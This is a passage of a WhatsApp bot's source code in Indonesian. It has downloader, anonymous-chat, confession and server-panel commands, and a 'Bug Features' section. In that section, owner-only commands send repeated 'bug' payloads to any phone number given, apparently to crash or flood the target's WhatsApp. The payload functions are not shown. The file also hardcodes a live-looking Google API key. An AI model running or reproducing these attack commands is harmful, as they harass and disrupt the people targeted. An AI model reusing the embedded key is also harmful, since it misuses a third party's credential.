    else if (extension === 'mp3') mimetype = 'audio/mp3'
    else mimetype = `application/${extension}`

    await Alice.sendMessage(m.chat, {
      document: media,
      fileName: fileNama,
      mimetype: mimetype
    }, { quoted: m })
  } catch (err) {
    console.error(err)
    reply('Terjadi kesalahan saat mendownload: ' + err.message)
  }
}
break

case 'ccdl':
case 'capcut': {
if (isBan) return XRB()
await XReaction()
  try {
    if (!text) return reply(`Contoh: ${XyrooRynzz} linknya`)
    if (!text.includes('capcut.com') && !text.includes('capcut.net')) return reply('Harus berupa link capcut!')
    const videoData = await Capcut(text)

    if (videoData && videoData.medias && videoData.medias.length > 0) {
      const videoUrl = videoData.medias[0].url
      return await Alice.sendMessage(m.chat, {
        video: {
          url: videoUrl
        },
        caption: `© ${botname}`
      }, {
        quoted: m
      })
    } else {
      return reply('Video tidak ditemukan.')
    }
  } catch (err) {
    console.error(err)
    reply('Terjadi kesalahan')
  }
}
break

case 'videy':
case 'videydl': {
if (isBan) return XRB()
await XReaction()
  try {
    if (!text) return reply(`Contoh: ${XyrooRynzz} linknya`)
    let twitter = await fetchJson(`https://vapis.my.id/api/videy?url=${Enc(text)}`)
    Alice.sendMessage(m.chat, {
      video: {
        url: twitter.data
      },
      caption: `${packname}`
    }, {
      quoted: m
    })
  } catch (err) {
    reply(`Terjadi kesalahan`);
  }
}
break

case 'ig':
case 'instagram': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply("Masukkan Linknya ?");
    if (!isURL(text)) return reply("Masukkan Linknya ?");
    await XReaction()
    const mediaUrl = await igdl(text);
    const url_media = mediaUrl[0].url;
    try {
        const response = await axios.head(url_media); 
        const contentType = response.headers['content-type']; // Mendapatkan tipe konten dari header
        if (contentType.startsWith('image/')) {
            await Alice.sendMessage(m.chat, { image: { url: url_media}, caption: 'donee' }, { quoted: m });
            return
        } else {
            await Alice.sendMessage(m.chat, { video: { url: url_media}, caption: 'donee' }, { quoted: m });
            return 
        }
    } catch(e) {
        return XRR()
    }
}
break

case 'tt': 
case 'tiktok': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} linknya`)
await XReaction()
let data = await fg.tiktok(text)
let json = data.result
let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
caption += `◦ *Id* : ${json.id}\n`
caption += `◦ *Username* : ${json.author.nickname}\n`
caption += `◦ *Title* : ${(json.title)}\n`
caption += `◦ *Like* : ${(json.digg_count)}\n`
caption += `◦ *Comments* : ${(json.comment_count)}\n`
caption += `◦ *Share* : ${(json.share_count)}\n`
caption += `◦ *Play* : ${(json.play_count)}\n`
caption += `◦ *Created* : ${json.create_time}\n`
caption += `◦ *Size* : ${json.size}\n`
caption += `◦ *Duration* : ${json.duration}`
if (json.images) {
json.images.forEach(async (k) => {
await Alice.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
} else {
Alice.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
setTimeout(() => {
Alice.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
}, 3000)
}
}
break

case 'aio':
  if (!q) return reply('link Sosmed?')
   try {
    async function fetchInitialPage(initialUrl) {
      try {
        const axios = require('axios')
        const cheerio = require('cheerio')
        const headers = {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
          'Referer': initialUrl,
        }
        const response = await axios.get(initialUrl, { headers })
        const $ = cheerio.load(response.data)
        const csrfToken = $('meta[name="csrf-token"]').attr('content')
        if (!csrfToken) throw new Error('Gagal nemu token keamanan, coba lagi!')
        let cookies = ''
        if (response.headers['set-cookie']) {
          cookies = response.headers['set-cookie'].join('; ')
        }
        return { csrfToken, cookies }
      } catch (error) {
        throw new Error(`Gagal ambil halaman awal: ${error.message}`)
      }
    }
    async function postDownloadRequest(downloadUrl, userUrl, csrfToken, cookies) {
      try {
        const axios = require('axios')
        const headers = {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
          'Referer': 'https://on4t.com/online-video-downloader',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Accept': '*/*',
          'X-Requested-With': 'XMLHttpRequest',
          'Cookie': cookies
        }
        const postData = new URLSearchParams()
        postData.append('_token', csrfToken)
        postData.append('link[]', userUrl)
        const response = await axios.post(downloadUrl, postData.toString(), { headers })
        if (response.data?.result?.length) {
          return response.data.result.map(item => ({
            title: item.title,
            thumb: item.image,
            url: item.video_file_url || item.videoimg_file_url
          }))
        } else {
          throw new Error('Respons dari server gak sesuai harapan, coba link lain!')
        }
      } catch (error) {
        throw new Error(`Gagal proses permintaan download: ${error.message}`)
      }
    }
    async function sendMediaAutoType(url, title) {
      try {
        const axios = require('axios')
        const { fromBuffer } = require('file-type')   
        const res = await axios.get(url, { responseType: 'arraybuffer' })
        const buff = Buffer.from(res.data)
        const fileInfo = await fromBuffer(buff)
        if (!fileInfo) return reply(`Gagal deteksi tipe file: ${title}`)
        let mime = fileInfo.mime
        let ext = fileInfo.ext
        if (mime.startsWith('video/')) {
          await Alice.sendMessage(m.chat, { video: buff, caption: title }, { quoted: m })
        } else if (mime.startsWith('audio/')) {
          await Alice.sendMessage(m.chat, { audio: buff, mimetype: mime }, { quoted: m })
        } else if (mime.startsWith('image/')) {
          await Alice.sendMessage(m.chat, { image: buff, caption: title }, { quoted: m })
        } else {
          await Alice.sendMessage(m.chat, {
            document: buff,
            fileName: `${title}.${ext}`,
            mimetype: mime
          }, { quoted: m })
        }
      } catch (err) {
        reply(`Gagal kirim media: ${err.message}`)
      }
    }
    const initialUrl = 'https://on4t.com/online-video-downloader'
    const downloadUrl = 'https://on4t.com/all-video-download'
    const { csrfToken, cookies } = await fetchInitialPage(initialUrl)
    const results = await postDownloadRequest(downloadUrl, q, csrfToken, cookies)
    for (let i = 0; i < results.length; i++) {
      await sendMediaAutoType(results[i].url, results[i].title)
    }
    await Alice.sendMessage(m.chat, { react: { text: '💕', key: m.key } })
  } catch (err) {
    await Alice.sendMessage(m.chat, { react: { text: '😳', key: m.key } }) 
    reply(err.message)
  }
  break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Downloader Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\




//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Menfess Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\

case 'anonymous':
case 'anonymouschat': {
if (isBan) return XRB()
await XReaction()
if (!isPc) return XRPC()
  reply(`Hai ${pushname} selamat datang di Anonymous chat!\n\nKetik ${Xyroo}start untuk memulai sesi chat`)
}
break

case 'start':
case 'mulai': {
if (isBan) return XRB()
await XReaction()
if (!isPc) return XRPC()
  this.anonymous = this.anonymous ? this.anonymous : {}
  if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
    reply(`Kamu masih berada di dalam sesi Anonymous!\n\n${Xyroo}leave untuk keluar dari sesi chat`)
    return false
  }
  let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
  if (room) {
    Alice.sendMessage(room.a, {
      text: `Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${Xyroo}skip untuk mencari partner lain\n${Xyroo}leave untuk menghentikan sesi chat`
    })
    room.b = m.sender
    room.state = 'CHATTING'
    reply(`Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${Xyroo}skip untuk mencari partner lain\n${Xyroo}leave untuk menghentikan sesi chat`)
  } else {
    let id = +new Date
    this.anonymous[id] = {
      id,
      a: m.sender,
      b: '',
      state: 'WAITING',
      check: function (who = '') {
        return [this.a, this.b].includes(who)
      },
      other: function (who = '') {
        return who === this.a ? this.b : who === this.b ? this.a : ''
      },
    }
    reply(`Menunggu partner...`)
  }
}
break

case 'leave':
case 'keluar': {
if (isBan) return XRB()
await XReaction()
if (!isPc) return XRPC()
  this.anonymous = this.anonymous ? this.anonymous : {}
  let room = Object.values(this.anonymous).find(room => room.check(m.sender))
  if (!room) {
    reply(`Kamu sedang tidak berada di sesi Anonymous!\n\n${Xyroo}start untuk memulai sesi chat`)
    return false
  }
  reply('Berhasil keluar dari Anonymous chat!')
  let other = room.other(m.sender)
  if (other) await Alice.sendText(other, `Partner telah meninggalkan sesi Anonymous!`, m)
  delete this.anonymous[room.id]
  if (command === 'leave')
    break
}
break

case 'skip':
case 'next':
case 'lanjut': {
if (isBan) return XRB()
await XReaction()
if (!isPc) return XRPC()
  this.anonymous = this.anonymous ? this.anonymous : {}
  let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
  if (!romeo) {
    reply(`Kamu sedang tidak berada di sesi Anonymous!\n\n${Xyroo}start untuk mencari partner`)
    return false
  }
  let other = romeo.other(m.sender)
  if (other) await Alice.sendText(other, `Partner telah meninggalkan sesi Anonymous!`, m)
  delete this.anonymous[romeo.id]
  let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
  if (room) {
    Alice.sendMessage(room.a, {
      text: `Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${Xyroo}skip untuk mencari partner lain\n${Xyroo}leave untuk menghentikan sesi chat`
    })
    room.b = m.sender
    room.state = 'CHATTING'
    reply(`Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${Xyroo}skip untuk mencari partner lain\n${Xyroo}leave untuk menghentikan sesi chat`)
  } else {
    let id = +new Date
    this.anonymous[id] = {
      id,
      a: m.sender,
      b: '',
      state: 'WAITING',
      check: function (who = '') {
        return [this.a, this.b].includes(who)
      },
      other: function (who = '') {
        return who === this.a ? this.b : who === this.b ? this.a : ''
      },
    }
    reply(`Menunggu partner...`)
  }
}
break

case 'confes':
case 'menfes':
case 'confess':
case 'menfess': {
if (isBan) return XRB()
await XReaction()
    this.menfes = this.menfes ? this.menfes : {}
    const roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (m.isGroup) return XRPC()
    if (roof) return reply("Kamu masih berada dalam sesi menfess")
    if (!text) return reply(`Contoh: ${XyrooRynzz} Nama, 628xx, Menfes nih\n`)
    if (!text.includes(',')) return reply(`Contoh: ${XyrooRynzz} Nama, 628xxx, Menfes nih\n`)

    const parts = text.split(',').map(item => item.trim());
    if (parts.length < 3) return reply(`Format salah! Contoh: ${XyrooRynzz} Nama, 628xx, Menfes nih\n`);
    
    const [namaNya, nomorNyaRaw, pesanNya] = parts;
    let nomorNya = nomorNyaRaw.startsWith('0') ? '62' + nomorNyaRaw.slice(1) : nomorNyaRaw;
    
    if (isNaN(nomorNya)) return reply(`Nomor tidak valid! Contoh: ${XyrooRynzz} Nama, 628xx, Menfes nih\n`);
    
    const yoi = `Dari: ${namaNya}\nPesan: ${pesanNya}\n\nKlik *Terima* untuk menerima menfess\nKlik *Tolak* untuk menolak menfess`;
    const id = m.sender;
    
    this.menfes[id] = {
        id,
        a: m.sender,
        b: `${nomorNya}@s.whatsapp.net`,
        state: 'WAITING'
    };
    
    try {
        await Alice.sendMessage(`${nomorNya}@s.whatsapp.net`, {
            text: yoi,
            footer: ownername,
            buttons: [
                {
                    buttonId: '.balasmenfes',
                    buttonText: { displayText: 'Terima' },
                    type: 1
                },
                {
                    buttonId: '.tolakmenfes',
                    buttonText: { displayText: 'Tolak' },
                    type: 1
                }
            ],
            headerType: 1,
            viewOnce: true
        })
        reply('Pesan berhasil dikirim ke nomor tujuan. Semoga dibales ya')
    } catch (error) {
        console.error(error)
        reply('Pesan gagal dikirim. Periksa kembali nomor tujuan.')
    }
}
break

case 'balasconfes':
case 'balasmenfes':
case 'balasconfess':
case 'balasmenfess': {
if (isBan) return XRB()
await XReaction()
    roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
    if (!roof) return reply("Belum ada sesi menfess")
    find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
    let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
    let other = [room, room.b].find(user => user !== m.sender)
    find.b = m.sender
    find.state = 'CHATTING'
    this.menfes[find.id] = {
        ...find
    }
    await Alice.sendMessage(other, {
        text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\n\n*NOTE:*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`,
        mentions: [m.sender]
    })
    Alice.sendMessage(m.chat, {
        text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\n\n*NOTE:*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`
    })
}
break

case 'tolakconfes':
case 'tolakmenfes':
case 'tolakconfess':
case 'tolakmenfess': {
if (isBan) return XRB()
await XReaction()
    roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
    if (!roof) return reply("Belum ada sesi menfess")
    let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
    let other = [room.a, room.b].find(user => user !== m.sender)
    find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
    Alice.sendMessage(other, {
        text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`,
        mentions: [m.sender]
    })
    reply("Menfess berhasil di tolak")
    delete this.menfes[roof.id]
}
break

case 'stopconfes':
case 'stopmenfes':
case 'stopconfess':
case 'stopmenfess': {
if (isBan) return XRB()
await XReaction()
    find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
    if (!find) return reply("Belum ada sesi menfess")
    const to = find.a == m.sender ? find.b : find.a
    Alice.sendMessage(to, {
        text: `Teman chat telah menghentikan menfess ini`,
        mentions: [m.sender]
    })
    reply("Menfess berhasil di stop")
    delete this.menfes[find.id]
}
break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Menfess Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Bug Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\

case "x-spam": {
if (!isOwner) return XRO()
let y = text.split(",")
if (y.length < 2) return reply(`Example: ${XyrooRynzz} Nomor,Jumlah`)
let anu = y[0]
let jumlah = y[1]
let target = anu.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
await Xdelayy(target, jumlah)
await Alice.sendMessage(m.chat, { image: { url: thumb }, caption: `*Done Send Bug To Target\n*© XyrooRynzz 2025*`})
}
break

case "x-hama": {
if (!isOwner) return XRO()
if (!q) return reply(`Example: ${XyrooRynzz} Nomor`)
let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
await Xdelayy(target, 30)
await Alice.sendMessage(m.chat, { image: { url: thumb }, caption: `Done Send Bug To Target\n*© XyrooRynzz 2025*`})
}
break

case "x-vision": {
if (!isOwner) return XRO()
if (!q) return reply(`Example: ${XyrooRynzz} Nomor`)
let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
await Xdelayy(target, 50)
await Alice.sendMessage(m.chat, { image: { url: thumb }, caption: `Done Send Bug To Target\n*© XyrooRynzz 2025*`})
}
break

case 'x-vixiv': {
if (!isOwner) return XRO()
if (!q) return reply(`Example: ${XyrooRynzz} Nomor`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"

for (let i = 0; i < 70; i++) {
await img1(target)
await img1(target)
await carousel(target)
await erwin(target)
}
let kucay = `
Done Send Bug To Target\n*© XyrooRynzz 2025*`
Alice.sendMessage(m.chat, { image: { url: thumb},
caption: kucay,
gifPlayback: false,
}, { quoted: m });

}
break

case 'x-maker': {
if (!isOwner) return XRO()
if (!q) return reply(`Example: ${XyrooRynzz} Nomor`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 70; i++) {
await img1(target)
await img1(target)
await carousel(target)
await erwin(target)
}
let memem = `
Done Send Bug To Target\n*© XyrooRynzz 2025*`
Alice.sendMessage(m.chat, { image: { url: thumb },
caption: memem,
gifPlayback: false,
}, { quoted: m });
}
break
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Bug Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Panel Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\

case "buatpanel": case "cpanel": {
if (!isPrem) return XRP()
if (!args[0]) return reply(`Masukkan Username`)
global.panel = [text.toLowerCase()]
let teksnya = "Silahkan Pilih Ram Server Panel"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdreply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: packname
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"⭐\", "rows": [{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".1gb ${teks}" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".2gb ${text}" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".3gb ${text}" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".4gb ${text}" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".5gb ${text}" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".6gb ${text}" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".7gb ${text}" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".8gb ${text}" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".9gb ${text}" },
{ "header": "Ram 10GB", "title": "Ram 10GB | CPU 250%", "id": ".10gb ${text}" }, 
{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU 0%", "id": ".unli ${text}" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: null}) 
await Alice.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unli": {
if (!isPrem) return XRP()
if (global.panel == null) return reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = `${packname}`
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `✅ Succes Create Panel

User: ${user.username}
Password: ${password.toString()}
Link Login: https://xyroorynzz-privateserver.vcloudxossrv.me


Note 📝: Bergaransi 30Day Full, Claim Garansi? Sertakan Bukti Transfer Atau Bukti Transaksi Membeli Panel Nya. Admin Hanya Mengirim Data Panel 1 Kali, Simpan Baik Baik Atau Anda Akan Kehilangan Servernya..


Testimoni: https://whatsapp.com/channel/0029VamvtL2ADTO7ikBeNe1E
WhatsApo Channel: https://whatsapp.com/channel/0029VaagYHwCnA82hDK7l31D

Thanks For Ordering!
© XyrooRynzz`

let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdreply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: packname
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: null}) 
await Alice.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel = null
}
break  


case "delpanel": {
if (!isPrem) return XRP()
if (!text) return reply("id server")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return reply("Server panel tidak ditemukan!")
reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

                case "listsrv": {
if (!isPrem) return XRP()
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyplta
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Alice.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${Xyroo}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }        
}
break;
              case "listusr": {
if (!isPrem) return XRP()
  
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyplta
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Alice.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Panel Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\



//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Premium Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'aiedit': case 'editai': {
if (!isPrem) return XRP()
await XReaction()
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || "";
 if (!text) {
 return reply(`Harap masukkan prompt custom!\n\nContoh: ${XyrooRynzz} buatkan foto itu lebih estetik.`);
 }
 if (!mime) {
 return reply("Tidak ada gambar yang direply! Silakan reply gambar dengan format jpg/png.");
 }
 if (!/image\/(jpe?g|png)/.test(mime)) {
 return reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png.`);
 }
 try {
 let imgData = await q.download();
 let genAI = new GoogleGenerativeAI("AIzaSyB8T-3WnKqDbK3GSYYUtTiyDfIV-vBxoPw");
 const base64Image = imgData.toString("base64");
 const contents = [
 { text: text }, 
 {
 inlineData: {
 mimeType: mime,
 data: base64Image
 }
 }
 ];
 const model = genAI.getGenerativeModel({
 model: "gemini-2.0-flash-exp-image-generation",
 generationConfig: {
 responseModalities: ["Text", "Image"]
 },
 });
 const response = await model.generateContent(contents);
 let resultImage;
 let resultText = "";
 for (const part of response.response.candidates[0].content.parts) {
 if (part.text) {
 resultText += part.text;
 } else if (part.inlineData) {
 const imageData = part.inlineData.data;
 resultImage = Buffer.from(imageData, "base64");
 }
 }
 if (resultImage) {
 const tmpDir = path.join(process.cwd(), "tmp");
 if (!fs.existsSync(tmpDir)) {
 fs.mkdirSync(tmpDir, { recursive: true });
 }
 let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
 fs.writeFileSync(tempPath, resultImage);
 await Alice.sendMessage(m.chat, { 
 image: { url: tempPath },
 caption: `*Edit selesai sesuai permintaan!*`
 }, { quoted: m });
 setTimeout(() => {
 try {
 fs.unlinkSync(tempPath);
 } catch (err) {
 console.error("Gagal menghapus file sementara:", err);
 }
 }, 30000);
 } else {
 reply("Gagal memproses gambar.");
 }
 } catch (error) {
 console.error(error);
 reply(`Error: ${error.message}`);
 }
}
break 
case "hytamkan": {
if (!isPrem) return XRP()
await XReaction()
  if (!m.quoted) return reply(`Kirim/reply gambar dengan caption *${XyrooRynzz}*`);
  let mime = m.quoted.mimetype || "";
